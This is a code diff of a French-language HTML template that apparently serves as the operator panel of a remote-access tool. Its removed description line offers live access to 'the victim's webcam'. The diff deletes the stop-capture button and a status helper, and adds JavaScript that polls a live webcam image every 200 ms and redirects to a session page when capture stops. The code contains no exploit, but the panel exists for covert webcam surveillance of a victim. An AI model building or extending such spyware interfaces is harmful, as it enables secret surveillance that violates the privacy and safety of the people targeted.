@@ -4,7 +4,7 @@
   {% if has_webcam %}
 
 	{% if not enabled %}
-	<p>Accédez en direct à la webcam de la victime. La fréquence de rafraîchissement de l'image est fixée à 5 secondes.</p>
+
 	<p class="text-center">
 		<a class="btn btn-primary" href="?action=start" role="button"><i class="fas fa-play    "></i> Lancer la capture</a>
 	</p>
@@ -16,9 +16,6 @@
 	</noscript>
 
 
-	<p class="text-center">
-		<a class="btn btn-danger" href="?action=stop" role="button"><i class="fas fa-stop    "></i> Arrêter la capture</a>
-	</p>
 	<div style="float: right">
 		<div class="spinner-grow text-danger" role="status">
 			<span class="sr-only">Capture en cours...</span>
@@ -32,28 +29,25 @@
 	</p>
 
 	<script language="javascript">
-	function updateStatus(msg) {
-		var status = document.getElementById("status");
-		status.innerText = msg;
-	}
-
 	function noImage() {
 		document.getElementById("streamer").style = "display:none";
-		updateStatus("Waiting");
 	}
 
 	function updateFrame() {
 		const req = new XMLHttpRequest();
-		var img = document.getElementById("streamer");
+	        var img = document.getElementById("streamer");
 
 		req.onreadystatechange = function(event) {
 			// XMLHttpRequest.DONE === 4
 			if (this.readyState === XMLHttpRequest.DONE) {
 				if (this.status === 200) {
-
 					img.src = "{{ live_url }}" + "?" + new Date().getTime();
-					img.style = "display:";
-					updateStatus("Playing");
+                                	img.style = "display:";
+                                        value = JSON.parse(this.responseText).value;
+	                                if (!value) {
+                                               location.replace(window.location.protocol + '//' + window.location.host + '/sessions/{{ id }}/session_live');
+	                                }
+	
 				} else {
 					console.log("Status answer: %d (%s)", this.status, this.statusText);
 				}
@@ -65,7 +59,6 @@
 	}
 
 	setInterval(function() { updateFrame(); }, 200);
-	updateFrame();
 	</script>
 	{% endif %}
 
